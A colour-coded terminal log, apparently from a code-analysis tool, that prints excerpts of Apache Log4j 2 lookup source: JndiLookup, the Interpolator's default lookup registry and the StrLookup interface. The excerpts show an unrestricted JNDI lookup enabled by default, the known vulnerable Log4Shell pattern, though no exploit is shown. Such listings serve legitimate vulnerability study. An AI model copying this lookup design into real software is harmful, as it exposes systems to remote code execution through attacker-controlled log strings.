[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.lookup;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import javax.naming.InitialContext;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import javax.naming.NamingException;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m: * Looks up keys from JNDI resources.[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"jndi"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:public class JndiLookup implements StrLookup [0m[1;39m{[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:    private static boolean ENABLE_JNDI = true;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    [0m[35m/[0m[39m** JNDI resourcce path prefix used in a J2EE container *[0m[35m/[0m                   [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = [0m[32m"java:comp/env/"[0m[39m;[0m  [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:     * Get the value of the JNDI resource.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * @param key  the JNDI resource name to be looked up, may be null[0m           [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * @return The value of the JNDI resource.[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        return [0m[1;35mlookup[0m[1;39m([0m[39mnull, key[0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * Get the value of the JNDI resource.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     * @param event The current LogEvent [0m[1;39m([0m[39mis ignored by this StrLookup[0m[1;39m)[0m[39m.[0m         [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * @param key  the JNDI resource name to be looked up, may be null[0m           [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     * @return The value of the JNDI resource.[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        if [0m[1;39m([0m[39mkey == null || ! ENABLE_JNDI[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:            InitialContext ctx = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:            return [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mctx.lookup[0m[1;39m([0m[1;35mconvertJndiName[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mNamingException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:     * Convert the given JNDI name to the actual JNDI name to use.[0m               [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:     * Default implementation applies the [0m[32m"java:comp/env/"[0m[39m prefix[0m                [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:     * unless other scheme like [0m[32m"java:"[0m[39m is given.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:     * @param jndiName The name of the resource.[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:     * @return The fully qualified name to look up.[0m                              [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:    private String [0m[1;35mconvertJndiName[0m[1;39m([0m[39mString jndiName[0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:        if [0m[1;39m([0m[39m![0m[1;35mjndiName.startsWith[0m[1;39m([0m[39mCONTAINER_JNDI_RESOURCE_PATH_PREFIX[0m[1;39m)[0m[39m && [0m        [2m                [0m
[2;36m                    [0m         [1;35mjndiName.indexOf[0m[1;39m([0m[32m':'[0m[1;39m)[0m[39m == [0m[1;36m-1[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;[0m           [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:        return jndiName;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:    public static void [0m[1;35msetEnableJndi[0m[1;39m([0m[39mboolean enableJndi[0m[1;39m)[0m[39m [0m[1;39m{[0m                       [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:        ENABLE_JNDI = enableJndi;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:    public static boolean [0m[1;35misEnableJndi[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:        return ENABLE_JNDI;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.jav[0m[1;92ma:1[0m[39m-[0m[1;36m27[0m      [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.lookup;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.util.HashMap;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import java.util.Map;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.Logger;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginManager;[0m               [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginType;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:import org.apache.logging.log4j.status.StatusLogger;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.jav[0m[1;92ma:36[0m[39m-[0m[1;36m67[0m     [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    private static final char PREFIX_SEPARATOR = [0m[32m':'[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:    private final Map<String, StrLookup> lookups = new HashMap<String, [0m          [2m                [0m
[2;36m                    [0m         [39mStrLookup>[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    private final StrLookup defaultLookup;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    public [0m[1;35mInterpolator[0m[1;39m([0m[39mfinal StrLookup defaultLookup[0m[1;39m)[0m[39m [0m[1;39m{[0m                         [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        this.defaultLookup = defaultLookup == null ? new [0m[1;35mMapLookup[0m[1;39m([0m[39mnew [0m          [2m                [0m
[2;36m                    [0m         [39mHashMap<String, String>[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m : defaultLookup;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:        final PluginManager manager = new [0m[1;35mPluginManager[0m[1;39m([0m[32m"Lookup"[0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:        [0m[1;35mmanager.collectPlugins[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:        final Map<String, PluginType> plugins = [0m[1;35mmanager.getPlugins[0m[1;39m([0m[1;39m)[0m[39m;[0m            [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:        for [0m[1;39m([0m[39mfinal Map.Entry<String, PluginType> entry : [0m[1;35mplugins.entrySet[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m   [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:            @[0m[1;35mSuppressWarnings[0m[1;39m([0m[32m"unchecked"[0m[1;39m)[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:            final Class<StrLookup> clazz = [0m[1;35mentry.getValue[0m[1;39m([0m[1;39m)[0m[1;35m.getPluginClass[0m[1;39m([0m[1;39m)[0m[39m;[0m    [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:            try [0m[1;39m{[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:                [0m[1;35mlookups.put[0m[1;39m([0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[39m, [0m[1;35mclazz.newInstance[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:            [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:                [0m[1;35mLOGGER.error[0m[1;39m([0m[32m"Unable to create Lookup for "[0m[39m + [0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[39m, [0m   [2m                [0m
[2;36m                    [0m         [39mex[0m[1;39m)[0m[39m;[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:     * Create the default Interpolator using only Lookups that work without an [0m  [2m                [0m
[2;36m                    [0m         [39mevent.[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:    public [0m[1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        this.defaultLookup = new [0m[1;35mMapLookup[0m[1;39m([0m[39mnew HashMap<String, String>[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m       [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"sys"[0m[39m, new [0m[1;35mSystemPropertiesLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                        [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"env"[0m[39m, new [0m[1;35mEnvironmentLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"jndi"[0m[39m, new [0m[1;35mJndiLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.jav[0m[1;92ma:99[0m[39m-[0m[1;36m124[0m    [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m99[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, String var[0m[1;39m)[0m[39m [0m[1;39m{[0m                    [2m                [0m
[2;36m                    [0m         [1;36m101[0m[39m:        if [0m[1;39m([0m[39mvar == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m102[0m[39m:            return null;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m103[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m104[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m105[0m[39m:        final int prefixPos = [0m[1;35mvar.indexOf[0m[1;39m([0m[39mPREFIX_SEPARATOR[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m106[0m[39m:        if [0m[1;39m([0m[39mprefixPos >= [0m[1;36m0[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m107[0m[39m:            final String prefix = [0m[1;35mvar.substring[0m[1;39m([0m[1;36m0[0m[39m, prefixPos[0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m108[0m[39m:            final String name = [0m[1;35mvar.substring[0m[1;39m([0m[39mprefixPos + [0m[1;36m1[0m[1;39m)[0m[39m;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m109[0m[39m:            final StrLookup lookup = [0m[1;35mlookups.get[0m[1;39m([0m[39mprefix[0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:            String value = null;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m111[0m[39m:            if [0m[1;39m([0m[39mlookup != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m112[0m[39m:                value = event == null ? [0m[1;35mlookup.lookup[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m : [0m                  [2m                [0m
[2;36m                    [0m         [1;35mlookup.lookup[0m[1;39m([0m[39mevent, name[0m[1;39m)[0m[39m;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m113[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m114[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m115[0m[39m:            if [0m[1;39m([0m[39mvalue != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m116[0m[39m:                return value;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m117[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:            var = [0m[1;35mvar.substring[0m[1;39m([0m[39mprefixPos + [0m[1;36m1[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:        if [0m[1;39m([0m[39mdefaultLookup != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:            return event == null ? [0m[1;35mdefaultLookup.lookup[0m[1;39m([0m[39mvar[0m[1;39m)[0m[39m : [0m                 [2m                [0m
[2;36m                    [0m         [1;35mdefaultLookup.lookup[0m[1;39m([0m[39mevent, var[0m[1;39m)[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m123[0m[39m:        return null;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m124[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrLookup.jav[0m[1;92ma:1[0m[39m-[0m[1;36m87[0m         [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.lookup;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m: * Lookup a String key to a String value.[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m: * This class represents the simplest form of a string to string map.[0m            [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m: * It has a benefit over a map in that it can create the result on[0m               [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m: * demand based on the key.[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m: * This class comes complete with various factory methods.[0m                       [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m: * If these do not suffice, you can subclass and implement your own matcher.[0m     [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m: * For example, it would be possible to implement a lookup that used the[0m         [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m: * key as a primary key, and looked up the value on demand from the database[0m     [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m: * @version $Id$[0m                                                                 [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:public interface StrLookup [0m[1;39m{[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * Looks up a String key to a String value.[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     * The internal implementation may use any mechanism to return the value.[0m    [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:     * The simplest implementation is to use a Map. However, virtually any[0m       [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:     * implementation is possible.[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:     * For example, it would be possible to implement a lookup that used the[0m     [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:     * key as a primary key, and looked up the value on demand from the database[0m [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:     * Or, a numeric based implementation could be created that treats the key[0m   [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * as an integer, increments the value and return the result as a string -[0m   [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     * converting [0m[1;36m1[0m[39m to [0m[1;36m2[0m[39m, [0m[1;36m15[0m[39m to [0m[1;36m16[0m[39m etc.[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     * The [0m[1;39m{[0m[39m@link #[0m[1;35mlookup[0m[1;39m([0m[39mString[0m[1;39m)[0m[1;39m}[0m[39m method always returns a String, regardless of[0m [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:     * the underlying data, by converting it as necessary. For example:[0m          [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:     * <pre>[0m                                                                     [2m                [0m
